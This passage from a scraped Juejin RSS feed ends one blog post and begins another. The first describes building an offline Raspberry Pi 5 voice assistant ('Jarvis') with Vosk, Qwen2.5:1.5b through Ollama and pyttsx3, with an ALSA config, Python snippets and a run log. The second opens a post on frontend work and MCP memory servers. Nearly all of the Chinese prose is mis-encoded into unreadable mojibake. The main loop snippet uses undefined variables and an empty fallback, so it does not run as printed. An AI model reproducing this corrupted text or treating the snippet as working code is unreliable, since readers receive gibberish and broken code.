<p><strong>å‘å£°</strong>ï¼šUSB è¿·ä½ éŸ³ç®±</p>
<ul>
<li><em>æ³¨æ„ï¼šæ ‘è“æ´¾ 5 å–æ¶ˆäº† 3.5mm è€³æœºå­”ï¼Œå¿…é¡»ç”¨ USB å£°å¡æˆ– HDMI éŸ³é¢‘ï¼</em></li>
</ul>
</li>
<li>
<p><strong>æ‰§è¡Œ</strong>ï¼šLED ç¯ç  (GPIO 17) + æ•£çƒ­é£æ‰‡ (GPIO 27)</p>
</li>
</ul>
<h2 data-id="heading-2">ğŸ§  æŠ€æœ¯æ¶æ„ï¼šå¦‚ä½•å®ç°æ¯«ç§’çº§å“åº”ï¼Ÿ</h2>
<p>ä¸ºäº†è¿½æ±‚æè‡´é€Ÿåº¦ï¼Œæˆ‘æ”¾å¼ƒäº†åºå¤§çš„ SpeechRecognition + Google API æ–¹æ¡ˆï¼Œè½¬è€Œé‡‡ç”¨å…¨ç¦»çº¿æ¶æ„ï¼š</p>
<ol>
<li><strong>è€³æœµ (STT)</strong> ï¼šä½¿ç”¨ <strong>Vosk</strong> ç¦»çº¿æ¨¡å‹ã€‚40MB çš„è½»é‡çº§ä¸­æ–‡æ¨¡å‹ï¼Œåœ¨ Pi 5 ä¸Šè¯†åˆ«å‡ ä¹æ˜¯ç¬æ—¶çš„ã€‚</li>
<li><strong>å¤§è„‘ (LLM)</strong> ï¼šéƒ¨ç½² <strong>Ollama</strong> è¿è¡Œ <strong>Qwen2.5:1.5b</strong>ã€‚15äº¿å‚æ•°çš„æ¨¡å‹åœ¨ Pi 5 ä¸Šæ¨ç†é€Ÿåº¦æå¿«ï¼Œå®Œå…¨æ»¡è¶³æŒ‡ä»¤ç†è§£éœ€æ±‚ã€‚</li>
<li><strong>å˜´å·´ (TTS)</strong> ï¼šä½¿ç”¨ <strong>pyttsx3 + espeak</strong>ã€‚è™½ç„¶å£°éŸ³æœ‰ç‚¹æœºæ¢°æ„Ÿï¼Œä½†èƒœåœ¨ 0 å»¶è¿Ÿï¼Œä¸ç”¨ç­‰ Azure/OpenAI çš„ç”Ÿæˆæ—¶é—´ã€‚</li>
<li><strong>å…œåº•æœºåˆ¶ (å…³é”®)</strong> ï¼šä¸ºäº†é˜²æ­¢å°æ¨¡å‹å¶å°”â€œæŠ½é£â€ï¼ˆä¸è¿”å› JSONï¼‰ï¼Œæˆ‘åŠ å…¥äº†ä¸€å±‚<strong>è§„åˆ™å¼•æ“å…œåº•</strong>ï¼Œç¡®ä¿æ§åˆ¶æŒ‡ä»¤ 100% æ‰§è¡Œã€‚</li>
</ol>
<h2 data-id="heading-3">ğŸ’£ è¸©å‘å®å½•ï¼ˆé‡ç‚¹ï¼ï¼‰</h2>
<p>è¿™ä¸€è·¯èµ°æ¥å…¨æ˜¯å‘ï¼Œå¸Œæœ›èƒ½å¸®å¤§å®¶é¿é›·ï¼š</p>
<h3 data-id="heading-4">ğŸ•³ï¸ å‘ä¸€ï¼šTTS åªæœ‰ç”µæµå£°æˆ–æŠ¥é”™ <code>Error 524</code></h3>
<p><strong>ç°è±¡</strong>ï¼šä»£ç è¿è¡Œæ­£å¸¸ï¼Œæ—¥å¿—æ˜¾ç¤º <code>Jarvis: ç³»ç»Ÿä¸Šçº¿</code>ï¼Œä½†éŸ³ç®±æ²¡å£°éŸ³ï¼Œæˆ–è€…æŠ¥é”™ <code>Unknown error 524</code>ã€‚ <strong>åŸå› </strong>ï¼š</p>
<ol>
<li>æ ‘è“æ´¾ 5 é»˜è®¤éŸ³é¢‘èµ° HDMIï¼Œä¸”ç§»é™¤äº† 3.5mm æ¥å£ã€‚</li>
<li><code>pyttsx3</code> ç”Ÿæˆçš„æ˜¯å•å£°é“éŸ³é¢‘ï¼Œè€Œæˆ‘çš„ USB å£°å¡åªåƒç«‹ä½“å£°ï¼Œå¯¼è‡´ ALSA é©±åŠ¨å±‚æ‹’ç»æ’­æ”¾ (<code>Channels count non available</code>)ã€‚</li>
<li>éº¦å…‹é£å½•éŸ³å’Œ TTS æ’­æ”¾åŒæ—¶è¿›è¡Œï¼Œå¯¼è‡´å£°å¡èµ„æºå†²çªã€‚</li>
</ol>
<p><strong>âœ… è§£å†³</strong>ï¼š é…ç½® <code>~/.asoundrc</code> æ–‡ä»¶ï¼Œä½¿ç”¨ <code>plug</code> æ’ä»¶è‡ªåŠ¨è½¬æ¢æ ¼å¼ï¼Œå¹¶å¼ºåˆ¶ç»‘å®š USB å£°å¡ (Card 2)ã€‚</p>
<pre><code class="hljs language-#" lang="#">pcm.!default {
    type plug
    slave {
        pcm "hw:2,0"  # 2æ˜¯æˆ‘çš„USBå£°å¡ç¼–å·ï¼Œç”¨ aplay -l æŸ¥çœ‹
    }
}
ctl.!default {
    type hw
    card 2
}
</code></pre>
<h3 data-id="heading-5">ğŸ•³ï¸ å‘äºŒï¼šè´¾ç»´æ–¯è¯´â€œé¸Ÿè¯­â€ (Chinese lite?)</h3>
<p><strong>ç°è±¡</strong>ï¼šæ˜æ˜ç»™ä»–å‘çš„æ˜¯ä¸­æ–‡æ–‡æœ¬ï¼Œå®ƒè¯»å‡ºæ¥å…¨æ˜¯ä¹±ç è‹±æ–‡å‘éŸ³ã€‚ <strong>åŸå› </strong>ï¼š<code>pyttsx3</code> åœ¨ Linux ä¸‹é»˜è®¤è°ƒç”¨ <code>espeak</code> çš„è‹±æ–‡å¼•æ“ï¼Œä¸ä¼šè‡ªåŠ¨è¯†åˆ«ä¸­æ–‡æ–‡æœ¬ã€‚ <strong>âœ… è§£å†³</strong>ï¼šåœ¨ä»£ç åˆå§‹åŒ–æ—¶ï¼Œå¼ºåˆ¶éå†å¹¶é”å®šä¸­æ–‡è¯­éŸ³åŒ…ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># è‡ªåŠ¨å¯»æ‰¾ä¸­æ–‡è¯­éŸ³åŒ…é€»è¾‘</span>
voices = engine.getProperty(<span class="hljs-string">'voices'</span>)
<span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> voices:
    <span class="hljs-keyword">if</span> <span class="hljs-string">'zh'</span> <span class="hljs-keyword">in</span> v.<span class="hljs-built_in">id</span> <span class="hljs-keyword">or</span> <span class="hljs-string">'chinese'</span> <span class="hljs-keyword">in</span> v.name.lower():
        engine.setProperty(<span class="hljs-string">'voice'</span>, v.<span class="hljs-built_in">id</span>)
        <span class="hljs-keyword">break</span>
</code></pre>
<h3 data-id="heading-6">ğŸ•³ï¸ å‘ä¸‰ï¼šå¤§æ¨¡å‹â€œå·æ‡’â€</h3>
<p><strong>ç°è±¡</strong>ï¼šVosk å¬åˆ°äº†â€œæŠŠç¯æ‰“å¼€â€ï¼Œä½† Qwen 1.5B æœ‰æ—¶å€™æ²‰è¿·èŠå¤©ï¼Œè¿”å›çš„ JSON é‡Œ <code>device</code> æ˜¯ <code>null</code>ã€‚ <strong>âœ… è§£å†³</strong>ï¼šå¢åŠ <strong>æ··åˆé€»è¾‘ (Hybrid Logic)</strong> ã€‚ å¦‚æœ AI è¿”å›ç©ºæŒ‡ä»¤ï¼Œä»£ç ä¼šè‡ªåŠ¨æ­£åˆ™åŒ¹é…å…³é”®è¯ï¼ˆâ€œå¼€ç¯â€ã€â€œäº®â€ï¼‰ã€‚<strong>AI è´Ÿè´£èŠå¤©å’Œå¤æ‚ç†è§£ï¼Œè§„åˆ™è´Ÿè´£ä¿å‘½å…œåº•</strong>ã€‚</p>
<h2 data-id="heading-7">ğŸ’» æ ¸å¿ƒä»£ç ç§€</h2>
<p>è¿™æ˜¯æœ€ç»ˆç‰ˆçš„ <code>jarvis.py</code>ï¼Œé›†æˆäº†ä¸Šè¿°æ‰€æœ‰ä¿®å¤ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">try</span>:
    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
        data = stream.read(<span class="hljs-number">4000</span>, exception_on_overflow=<span class="hljs-literal">False</span>)
        <span class="hljs-keyword">if</span> rec.AcceptWaveform(data):
            result = json.loads(rec.Result())
            text = result[<span class="hljs-string">'text'</span>].replace(<span class="hljs-string">" "</span>, <span class="hljs-string">""</span>)
            
            <span class="hljs-keyword">if</span> text:
                <span class="hljs-built_in">print</span>(<span class="hljs-string">f"ğŸ‘‚ å¬åˆ°: <span class="hljs-subst">{text}</span>"</span>)
                <span class="hljs-comment"># å…³é”®è¯å”¤é†’ï¼Œå‡å°‘è¯¯è§¦</span>
                <span class="hljs-keyword">if</span> <span class="hljs-built_in">any</span>(k <span class="hljs-keyword">in</span> text <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> [<span class="hljs-string">"ç¯"</span>, <span class="hljs-string">"é£æ‰‡"</span>, <span class="hljs-string">"æ‰“å¼€"</span>, <span class="hljs-string">"å…³"</span>, <span class="hljs-string">"ä½ å¥½"</span>,<span class="hljs-string">"è´¾ç»´æ–¯"</span>]):
                    <span class="hljs-comment"># 1. è¯·æ±‚ AI å¤§è„‘</span>
                    action_data = ask_ai(text)
                    
                    <span class="hljs-comment"># 2. è§„åˆ™å…œåº•æ£€æŸ¥ (é˜²æ­¢ AI çŠ¯å‚»)</span>
                    <span class="hljs-keyword">if</span> action_data.get(<span class="hljs-string">"device"</span>) <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
                         <span class="hljs-comment"># ... è¿™é‡Œå†™æ­£åˆ™åŒ¹é…é€»è¾‘ ...</span>
                         <span class="hljs-keyword">pass</span>

                    <span class="hljs-comment"># 3. ç¡¬ä»¶æ‰§è¡Œ</span>
                    <span class="hljs-keyword">if</span> device == <span class="hljs-string">'light'</span>:
                        GPIO.output(PIN_LIGHT, GPIO.HIGH <span class="hljs-keyword">if</span> action == <span class="hljs-string">'on'</span> <span class="hljs-keyword">else</span> GPIO.LOW)
                    
                    <span class="hljs-comment"># 4. è¯­éŸ³åé¦ˆ</span>
                    speak(action_data.get(<span class="hljs-string">'reply'</span>))
</code></pre>
<h2 data-id="heading-8">ğŸ‰ æœ€ç»ˆæ•ˆæœ</h2>
<p>ç°åœ¨ï¼Œä¸ç®¡æ˜¯å–Šâ€œæ‰“å¼€é£æ‰‡â€ï¼Œè¿˜æ˜¯è·Ÿå®ƒé—²èŠâ€œè®²ä¸ªç¬‘è¯â€ï¼Œæ ‘è“æ´¾éƒ½èƒ½åœ¨ <strong>1ç§’å†…</strong> åšå‡ºååº”ã€‚</p>
<ul>
<li><strong>é—²èŠæ¨¡å¼</strong>ï¼šå¹½é»˜é£è¶£ã€‚</li>
<li><strong>æŒ‡ä»¤æ¨¡å¼</strong>ï¼šæŒ‡å“ªæ‰“å“ªï¼Œç¯å…‰é—ªçƒç¬é—´å“åº”ã€‚</li>
</ul>
<p>æˆåŠŸæ—¥å¿—å¦‚ä¸‹</p>
<pre><code class="hljs language-css" lang="css">æ—¥å¿—ï¼š
ğŸ¤– Jarvis: ç³»ç»Ÿå‡çº§å®Œæ¯•

ğŸ‘‚ å¬åˆ°: æ‰“å¼€é£æ‰‡

ğŸ§  AI æœ€ç»ˆå†³ç­–: {'device': <span class="hljs-string">'fan'</span>, <span class="hljs-string">'action'</span>: <span class="hljs-string">'on'</span>, <span class="hljs-string">'reply'</span>: <span class="hljs-string">'å¥½çš„ï¼Œé£æ‰‡å·²å¯åŠ¨'</span>}

ğŸ’¨ <span class="hljs-selector-attr">[ç¡¬ä»¶æ“ä½œ]</span> é£æ‰‡ -&gt; on

ğŸ¤– Jarvis: å¥½çš„ï¼Œé£æ‰‡å·²å¯åŠ¨

ğŸ‘‚ å¬åˆ°: æ‰“å¼€ç¯å…‰

ğŸ§  AI æœ€ç»ˆå†³ç­–: {'device': <span class="hljs-string">'light'</span>, <span class="hljs-string">'action'</span>: <span class="hljs-string">'on'</span>, <span class="hljs-string">'reply'</span>: <span class="hljs-string">'å¥½çš„ï¼Œç¯å…‰æ‰“å¼€äº†'</span>}

ğŸ’¡ <span class="hljs-selector-attr">[ç¡¬ä»¶æ“ä½œ]</span> ç¯ -&gt; on

ğŸ¤– Jarvis: å¥½çš„ï¼Œç¯å…‰æ‰“å¼€äº†

ğŸ‘‚ å¬åˆ°: å…³é—­ç¯å…‰

ğŸ§  AI æœ€ç»ˆå†³ç­–: {'device': <span class="hljs-string">'light'</span>, <span class="hljs-string">'action'</span>: <span class="hljs-string">'off'</span>, <span class="hljs-string">'reply'</span>: <span class="hljs-string">'å¥½çš„ï¼Œç¯å…‰å·²å…³é—­'</span>}

ğŸ’¡ <span class="hljs-selector-attr">[ç¡¬ä»¶æ“ä½œ]</span> ç¯ -&gt; off

ğŸ¤– Jarvis: å¥½çš„ï¼Œç¯å…‰å·²å…³é—­

ğŸ‘‚ å¬åˆ°: æ‰“å¼€é£æ‰‡

ğŸ§  AI æœ€ç»ˆå†³ç­–: {'device': <span class="hljs-string">'fan'</span>, <span class="hljs-string">'action'</span>: <span class="hljs-string">'on'</span>, <span class="hljs-string">'reply'</span>: <span class="hljs-string">'é£æ‰‡å·²å¯åŠ¨'</span>}

ğŸ’¨ <span class="hljs-selector-attr">[ç¡¬ä»¶æ“ä½œ]</span> é£æ‰‡ -&gt; on

ğŸ¤– Jarvis: é£æ‰‡å·²å¯åŠ¨

ğŸ‘‚ å¬åˆ°: å…³é—­é£æ‰‡

ğŸ§  AI æœ€ç»ˆå†³ç­–: {'device': <span class="hljs-string">'fan'</span>, <span class="hljs-string">'action'</span>: <span class="hljs-string">'off'</span>, <span class="hljs-string">'reply'</span>: <span class="hljs-string">'å¥½çš„ï¼Œé£æ‰‡å·²ç»å…³æ‰äº†'</span>}

ğŸ’¨ <span class="hljs-selector-attr">[ç¡¬ä»¶æ“ä½œ]</span> é£æ‰‡ -&gt; off

ğŸ¤– Jarvis: å¥½çš„ï¼Œé£æ‰‡å·²ç»å…³æ‰äº†

ğŸ§  AI æœ€ç»ˆå†³ç­–: {'device': None, <span class="hljs-string">'action'</span>: None, <span class="hljs-string">'reply'</span>: <span class="hljs-string">'æˆ‘æ˜¯ä½ çš„æ™ºèƒ½ç®¡å®¶åŠ©æ‰‹ã€‚'</span>}

ğŸ¤– Jarvis: æˆ‘æ˜¯ä½ çš„æ™ºèƒ½ç®¡å®¶åŠ©æ‰‹ã€‚

ğŸ‘‚ å¬åˆ°: å¯ä»¥è®²ä¸€ä¸ªç¬‘è¯å—

ğŸ§  AI æœ€ç»ˆå†³ç­–: {'device': None, <span class="hljs-string">'action'</span>: None, <span class="hljs-string">'reply'</span>: <span class="hljs-string">'å½“ç„¶äº†ï¼Œè¿™æ˜¯ä¸ªç»å…¸çš„ç¬‘è¯ã€‚ä¸ºä»€ä¹ˆæµ·æ´‹é‡Œçš„é±¼æ€»æ˜¯å–œæ¬¢èšåœ¨ä¸€èµ·ï¼Ÿå› ä¸ºå®ƒä»¬è§‰å¾—â€˜æ¸¸â€™åœ¨ä¸€èµ·æ›´æœ‰è¶£ï¼'</span>}

ğŸ¤– Jarvis: å½“ç„¶äº†ï¼Œè¿™æ˜¯ä¸ªç»å…¸çš„ç¬‘è¯ã€‚ä¸ºä»€ä¹ˆæµ·æ´‹é‡Œçš„é±¼æ€»æ˜¯å–œæ¬¢èšåœ¨ä¸€èµ·ï¼Ÿå› ä¸ºå®ƒä»¬è§‰å¾—â€˜æ¸¸â€™åœ¨ä¸€èµ·æ›´æœ‰è¶£ï¼

ğŸ‘‚ å¬åˆ°: ä»Šå¤©å¤©æ°”å¦‚ä½•

âš ï¸ æ£€æµ‹åˆ° AI æœªè¯†åˆ«è®¾å¤‡ï¼Œå¯åŠ¨è§„åˆ™å…œåº•æ£€æŸ¥...

ğŸ§  AI æœ€ç»ˆå†³ç­–: {'device': None, <span class="hljs-string">'action'</span>: None, <span class="hljs-string">'reply'</span>: <span class="hljs-string">'å¯¹ä¸èµ·ï¼Œæˆ‘ç›®å‰æ— æ³•è·å–å®æ—¶å¤©æ°”ä¿¡æ¯ã€‚'</span>}

ğŸ¤– Jarvis: å¯¹ä¸èµ·ï¼Œæˆ‘ç›®å‰æ— æ³•è·å–å®æ—¶å¤©æ°”ä¿¡æ¯ã€‚
</code></pre>
<h2 data-id="heading-9">ğŸ”® ä¸‹ä¸€æ­¥è®¡åˆ’</h2>
<p>è€³æœµå’Œå˜´å·´éƒ½æœ‰äº†ï¼Œä¸‹ä¸€æ­¥å°±æ˜¯**â€œçœ¼ç›â€ <strong>ï¼ æ˜å¤©æ‰“ç®—æŠ˜è…¾ Hailo-8L NPUï¼Œé…åˆæ ‘è“æ´¾ 5 çš„ PCIe æ¥å£ï¼Œè·‘ä¸€ä¸‹ YOLOv8ã€‚ ç›®æ ‡ï¼šå®ç°</strong>â€œäººæ¥ç¯äº®â€**çš„è§†è§‰ä¸»åŠ¨æ™ºèƒ½ï¼Œæ•¬è¯·æœŸå¾…ï¼</p>
<hr/>
<blockquote>
<p><strong>ä½œè€…åè®°</strong>ï¼š æåµŒå…¥å¼ AI çœŸçš„ç—›å¹¶å¿«ä¹ç€ã€‚è™½ç„¶ä¸ºäº†ä¸€ä¸ªå£°å¡é©±åŠ¨èƒ½æŠ˜è…¾ä¸€æ™šä¸Šï¼Œä½†å½“ç¯äº®èµ·çš„é‚£ä¸€åˆ»ï¼Œæ„Ÿè§‰è‡ªå·±å°±æ˜¯é’¢é“ä¾ ï¼ å¦‚æœä½ ä¹Ÿå¯¹æ ‘è“æ´¾ AIoT æ„Ÿå…´è¶£ï¼Œæ¬¢è¿è¯„è®ºåŒºäº¤æµ~ ğŸ‘‹</p>
</blockquote>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2F1115117860lxx-lang%2FPi-AIoT-Central" target="_blank" title="https://github.com/1115117860lxx-lang/Pi-AIoT-Central" ref="nofollow noopener noreferrer">ä»£ç è¯¦æƒ…</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AI æ—¶ä»£çš„å‰ç«¯ç©¶ç«Ÿè¿˜èƒ½ç§¯ç´¯ä»€ä¹ˆ]]></title>    <link>https://juejin.cn/post/7580674010838941742</link>    <guid>https://juejin.cn/post/7580674010838941742</guid>    <pubDate>2025-12-08T03:51:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580674010838941742" data-draft-id="7580971667036749850" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AI æ—¶ä»£çš„å‰ç«¯ç©¶ç«Ÿè¿˜èƒ½ç§¯ç´¯ä»€ä¹ˆ"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2025-12-08T03:51:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ½œæ°´è±†"/> <meta itemprop="url" content="https://juejin.cn/user/1996368848879678"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AI æ—¶ä»£çš„å‰ç«¯ç©¶ç«Ÿè¿˜èƒ½ç§¯ç´¯ä»€ä¹ˆ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1996368848879678/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ½œæ°´è±†
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T03:51:14.000Z" title="Mon Dec 08 2025 03:51:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">AI æ—¶ä»£çš„å‰ç«¯ç©¶ç«Ÿè¿˜èƒ½ç§¯ç´¯ä»€ä¹ˆ</h2>
<p>å½“ç„¶æ˜¯ç§¯ç´¯çš„å¯¹AIçš„çº¦æŸç»éªŒå’Œå…·ä½“é¡¹ç›®ä¸­æç‚¼çš„å·¥ä½œæµäº†ï¼Œä¸è¿‡æˆ‘æš‚æ—¶å°†ä»–ä»¬æè¿°æˆæˆä¸“å®¶å’Œå·¥ä½œæµï¼Œå…¶å®aiææ•ˆç”¨çš„åŸºæœ¬éƒ½æ˜¯è¿™ä¸ªæ€è·¯ã€‚å¥½å¤šå“¥ä»¬éƒ½éšéšå¯Ÿè§‰åˆ°è¿™è‚¡æœºç¼˜ï¼Œåªæ˜¯è¿Ÿè¿Ÿæ— æ³•å½»åº•å‚æ‚Ÿè¸ä¸Šä¿®ä»™ä¹‹è·¯ï¼Œä¸Šå‘¨æœºç¼˜å·§åˆä¹‹ä¸‹ï¼Œå‚ä¸äº†ä¸€æ¡è·¯ï¼Œç‰¹æ¥ç•™ä¸‹ä¸€æœ¬ç„šè¯€ï¼ŒğŸ¶</p>
<h3 data-id="heading-1">ä¿®ä»™æœ€é‡è¦çš„æ˜¯ç†æ¸…å¥‡ç»å…«è„‰ï¼Œè´¯é€šä¸€æ°”ï¼Œaiä¿®ä»™ä¹Ÿä¸€æ ·</h3>
<p>è¿™é‡Œæœ‰å…³é”®çš„ä¸¤æ­¥éª¤ï¼Œä¸€ä¸ªæ˜¯æ„å»ºmcpçš„æµç¨‹ï¼Œä¸€ä¸ªæ˜¯è·¨é¡¹ç›®çš„è®°å¿†mcp</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/831f68c187d24af7a2acd7a0f9b199e8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5r2c5rC06LGG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770673&amp;x-signature=%2BhfZgYGQNCj3EP94js2KskS2Zn4%3D" alt="image.png" loading="lazy"/></p>
<p>æ„å»ºä¸€ä¸ªå¯ä»¥è·¨é¡¹ç›®çš„ï¼Œæ ¹æ®æ¯æ¬¡ä¼šè¯è®°å½•ç‹¬ç«‹å­˜å‚¨åœ¨æœ¬åœ°çš„çš„è®°å¿†ç±»å‹çš„mcp,å…·ä½“çš„æ„å»ºï¼Œä½ ä¹Ÿå¯ä»¥è®©Aiå¸®ä½ å®Œæˆ</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e0682b60c7184b20a5f6b43db2ea6ece~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5r2c5rC06LGG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770673&amp;x-signature=TRT1QZvHVZazwOds5SBrkFkMUk8%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-2">ç¬¬äºŒéƒ¨å°±æ˜¯æ‰“é€ ä¸€å †ç§°æ‰‹çš„æ³•å®</h3>
<p>é¦–å…ˆæˆ‘ä»¬çŸ¥é“ç°åœ¨çš„ç¼–è¾‘å™¨æ˜¯ä¸èƒ½ç›´æ¥è¯»å–word ä¹‹ç±»çš„æ–‡æœ¬çš„ï¼Œä½†æ˜¯èƒ½éƒ½è¯»å–md,åŒç†åˆ›å»ºä¹‹</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7a953120e2ed4f8ea7f2536261d75bd3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5r2c5rC06LGG:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770673&amp;x-signature=RndNLvzxYbiLDQiGMBuMv6avO8Q%3D" alt="image.png" loading="lazy"/></p>
<p>ç„¶åå°±æ˜¯ä¸æ–­æ²‰æ·€ä¸‹æ¥çš„ä¸“å®¶äº†</p>
